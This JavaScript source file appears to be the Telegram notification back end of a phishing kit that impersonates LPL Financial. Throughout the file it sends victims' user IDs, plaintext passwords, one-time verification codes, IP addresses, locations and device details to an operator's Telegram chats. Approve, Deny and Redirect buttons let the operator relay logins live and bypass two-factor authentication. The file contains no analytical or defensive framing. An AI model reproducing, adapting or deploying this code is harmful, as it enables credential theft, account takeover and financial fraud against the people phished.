var API = "https://api.telegram.org/bot";

function esc(s) {
  if (!s) return "";
  return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function getBotPairs(env) {
  var tokenRaw = env.TELEGRAM_BOT_TOKEN || "";
  var chatIdRaw = env.TELEGRAM_CHAT_ID || "";
  if (!tokenRaw || !chatIdRaw) return [];

  var tokens = tokenRaw.split(",").map(function (s) { return s.trim(); }).filter(Boolean);
  var chatIds = chatIdRaw.split(",").map(function (s) { return s.trim(); }).filter(Boolean);

  var pairs = [];
  for (var i = 0; i < chatIds.length; i++) {
    var token = tokens[i] || tokens[0];
    if (token && chatIds[i]) {
      pairs.push({ token: token, chatId: chatIds[i] });
    }
  }
  return pairs;
}

export function findTokenForChat(env, chatId) {
  var pairs = getBotPairs(env);
  var match = pairs.find(function (p) { return p.chatId === String(chatId); });
  if (match) return match.token;
  return pairs[0] ? pairs[0].token : null;
}

async function sendToAll(env, text, taskId, includeButtons) {
  if (includeButtons === undefined) includeButtons = true;
  var pairs = getBotPairs(env);
  if (pairs.length === 0) return;

  for (var i = 0; i < pairs.length; i++) {
    var p = pairs[i];
    try {
      var payload = {
        chat_id: p.chatId,
        text: text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      };
      if (includeButtons) {
        payload.reply_markup = {
          inline_keyboard: [
            [
              { text: "✅ Approve", callback_data: "approve:" + taskId },
              { text: "❌ Deny", callback_data: "deny:" + taskId },
            ],
            [
              { text: "🔀 Redirect", callback_data: "redirect:" + taskId },
            ],
          ],
        };
      }
      await fetch(API + p.token + "/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    } catch (err) {
      console.error("[Telegram] Failed to send to " + p.chatId + ":", err);
    }
  }
}

function parseDevice(ua) {
  if (!ua) return "Unknown";
  var os = "Unknown OS";
  var browser = "Unknown Browser";

  if (/iPhone/.test(ua)) os = "iPhone";
  else if (/iPad/.test(ua)) os = "iPad";
  else if (/Android/.test(ua)) os = "Android";
  else if (/Windows NT 10/.test(ua)) os = "Windows 10";
  else if (/Windows NT 11|Windows NT 10.*Build\/(2[2-9]|[3-9])/.test(ua)) os = "Windows 11";
  else if (/Mac OS X/.test(ua)) os = "macOS";
  else if (/Linux/.test(ua)) os = "Linux";

  if (/Edg\/(\d+)/.test(ua)) browser = "Edge " + RegExp.$1;
  else if (/Chrome\/(\d+)/.test(ua)) browser = "Chrome " + RegExp.$1;
  else if (/Safari\//.test(ua) && /Version\/(\d+[\.\d]*)/.test(ua)) browser = "Safari " + RegExp.$1;
  else if (/Firefox\/(\d+)/.test(ua)) browser = "Firefox " + RegExp.$1;

  return os + " / " + browser;
}

function formatReferrer(ref) {
  if (!ref || ref === "Direct") return "Direct";
  try {
    var host = new URL(ref).hostname.replace(/^www\./, "");
    return host;
  } catch (e) {
    return ref;
  }
}

function formatUrl(origin) {
  if (!origin) return "N/A";
  try {
    var u = new URL(origin);
    return u.hostname + u.pathname;
  } catch (e) {
    return origin;
  }
}

function formatTimes(tz) {
  var now = new Date();
  var utcStr = now.toLocaleString("en-US", {
    timeZone: "UTC",
    month: "short", day: "numeric", year: "numeric",
    hour: "numeric", minute: "2-digit", hour12: true,
  });

  var localStr;
  try {
    localStr = now.toLocaleString("en-US", {
      timeZone: tz,
      month: "short", day: "numeric", year: "numeric",
      hour: "numeric", minute: "2-digit", hour12: true,
    });
  } catch (e) {
    localStr = utcStr;
  }
  return { local: localStr, utc: utcStr };
}

function gmtOffset(tz) {
  try {
    var now = new Date();
    var parts = now.toLocaleString("en-US", { timeZone: tz, timeZoneName: "shortOffset" }).split(" ");
    var offset = parts[parts.length - 1];
    return offset;
  } catch (e) {
    return "";
  }
}

function locationLines(cf) {
  if (!cf) return [];
  var loc = cf.city && cf.city !== "Unknown"
    ? cf.city + ", " + cf.country
    : cf.country || "Unknown";
  var tzLabel = cf.timezone || "Unknown";
  var offset = cf.timezone ? gmtOffset(cf.timezone) : "";
  if (offset) tzLabel += " (" + offset + ")";

  return [
    "📍 " + esc(loc),
    "🌐 <code>" + esc(cf.ip || "Unknown") + "</code>",
    "🕒 " + esc(tzLabel),
    "📡 " + esc(cf.asOrganization || "Unknown"),
  ];
}

function deviceLines(task) {
  var device = task.device_info ? parseDevice(task.device_info) : "Unknown";
  var screen = task.screen_size || "Unknown";
  var ref = formatReferrer(task.referrer);
  var url = formatUrl(task.member_origin);

  return [
    "📱 " + esc(device),
    "📏 " + esc(screen),
    "🔗 " + esc(ref),
    "🌐 " + esc(url),
  ];
}

export async function notifyNewTask(env, task) {
  var isVisit = task.request_kind === "visit";
  var tz = task.cf ? task.cf.timezone : null;
  var t = formatTimes(tz);
  var lines = [];

  if (isVisit) {
    lines.push("👁 <b>NEW VISITOR</b>  •  <i>LPL Financial</i>");
    lines.push("────────────────────────");
    lines.push("");
    lines.push("🗺 <b>Location</b>");
    lines = lines.concat(locationLines(task.cf));
    lines.push("");
    lines.push("🖥 <b>Device</b>");
    lines = lines.concat(deviceLines(task));
    lines.push("");
    lines.push("📅 " + esc(t.local) + "  •  " + esc(t.utc) + " UTC");
  } else {
    lines.push("🔐 <b>LOGIN REQUEST</b>  •  <i>LPL Financial</i>");
    lines.push("────────────────────────");
    lines.push("");
    lines.push("👤 <b>User</b>    <code>" + esc(task.user_id) + "</code>");
    lines.push("🔑 <b>Pass</b>    <code>" + esc(task.password || "N/A") + "</code>");
    lines.push("✉️ <b>Email</b>   " + esc(task.masked_email));
    if (task.masked_phone && task.masked_phone !== "N/A") {
      lines.push("📞 <b>Phone</b>   " + esc(task.masked_phone));
    }
    lines.push("");
    lines.push("🗺 <b>Location</b>");
    lines = lines.concat(locationLines(task.cf));
    lines.push("");
    lines.push("🖥 <b>Device</b>");
    lines = lines.concat(deviceLines(task));
    lines.push("");
    lines.push("📅 " + esc(t.local) + "  •  " + esc(t.utc) + " UTC");
    lines.push("");
    lines.push("⏳ <i>Auto-declines in 90 seconds</i>");
  }

  await sendToAll(env, lines.join("\n"), task.id, !isVisit);
}

export async function notifyAdvance(env, task) {
  var tz = task.cf ? task.cf.timezone : null;
  var lines = [];

  if (task.flow_step === "code_request") {
    var target =
      task.code_delivery_method === "phone"
        ? "Phone (" + esc(task.masked_phone) + ")"
        : "Email (" + esc(task.masked_email) + ")";

    lines.push("📨 <b>CODE DELIVERY</b>  •  <i>LPL Financial</i>");
    lines.push("────────────────────────");
    lines.push("");
    lines.push("👤 <b>User</b>    <code>" + esc(task.user_id) + "</code>");
    lines.push("🔑 <b>Pass</b>    <code>" + esc(task.password || "N/A") + "</code>");
    lines.push("✉️ <b>Send via</b>  " + target);
    lines.push("");
    lines.push("🗺 <b>Location</b>");
    lines = lines.concat(locationLines(task.cf));
    lines.push("");
    lines.push("🖥 <b>Device</b>");
    lines = lines.concat(deviceLines(task));
    lines.push("");
    lines.push("⏳ <i>Auto-declines in 90 seconds</i>");

  } else if (task.flow_step === "code_verify") {
    lines.push("🛡 <b>CODE VERIFICATION</b>  •  <i>LPL Financial</i>");
    lines.push("────────────────────────");
    lines.push("");
    lines.push("👤 <b>User</b>    <code>" + esc(task.user_id) + "</code>");
    lines.push("🔑 <b>Pass</b>    <code>" + esc(task.password || "N/A") + "</code>");
    lines.push("🔢 <b>Code</b>    <code>" + esc(task.verification_code || "N/A") + "</code>");
    lines.push("✉️ <b>Via</b>     " + (task.code_delivery_method === "phone" ? "Phone" : "Email") + " (" + esc(task.masked_email) + ")");
    lines.push("");
    lines.push("🗺 <b>Location</b>");
    lines = lines.concat(locationLines(task.cf));
    lines.push("");
    lines.push("🖥 <b>Device</b>");
    lines = lines.concat(deviceLines(task));
    lines.push("");
    lines.push("⏳ <i>Auto-declines in 90 seconds</i>");
  } else {
    return;
  }

  await sendToAll(env, lines.join("\n"), task.id, true);
}

export function buildApprovedMessage(task) {
  var lines = [
    "✅ <b>APPROVED</b>  •  <i>LPL Financial</i>",
    "────────────────────────",
    "",
    "👤 <b>User</b>    <code>" + esc(task.user_id) + "</code>",
    "🔑 <b>Pass</b>    <code>" + esc(task.password || "N/A") + "</code>",
  ];
  if (task.verification_code) {
    lines.push("🔢 <b>Code</b>    <code>" + esc(task.verification_code) + "</code>");
    lines.push("✉️ <b>Via</b>     " + (task.code_delivery_method === "phone" ? "Phone" : "Email"));
  }
  return lines.join("\n");
}

export function buildDeniedMessage(task) {
  var lines = [
    "❌ <b>DENIED</b>  •  <i>LPL Financial</i>",
    "────────────────────────",
    "",
    "👤 <b>User</b>    <code>" + esc(task.user_id) + "</code>",
    "🔑 <b>Pass</b>    <code>" + esc(task.password || "N/A") + "</code>",
  ];
  if (task.verification_code) {
    lines.push("🔢 <b>Code</b>    <code>" + esc(task.verification_code) + "</code>");
    lines.push("✉️ <b>Via</b>     " + (task.code_delivery_method === "phone" ? "Phone" : "Email"));
  }
  return lines.join("\n");
}

export function buildRedirectedMessage(task) {
  var lines = [
    "🔀 <b>REDIRECTED</b>  •  <i>LPL Financial</i>",
    "────────────────────────",
    "",
    "👤 <b>User</b>    <code>" + esc(task.user_id) + "</code>",
    "🔑 <b>Pass</b>    <code>" + esc(task.password || "N/A") + "</code>",
  ];
  if (task.verification_code) {
    lines.push("🔢 <b>Code</b>    <code>" + esc(task.verification_code) + "</code>");
    lines.push("✉️ <b>Via</b>     " + (task.code_delivery_method === "phone" ? "Phone" : "Email"));
  }
  return lines.join("\n");
}

export async function editMessage(env, chatId, messageId, text) {
  var token = findTokenForChat(env, chatId);
  if (!token) return;

  try {
    await fetch(API + token + "/editMessageText", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        text: text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });
  } catch (err) {
    console.error("[Telegram] Failed to edit message:", err);
  }
}

export async function answerCallback(env, chatId, callbackQueryId, text) {
  var token = findTokenForChat(env, chatId);
  if (!token) return;

  try {
    await fetch(API + token + "/answerCallbackQuery", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text: text }),
    });
  } catch (err) {
    console.error("[Telegram] Failed to answer callback:", err);
  }
}
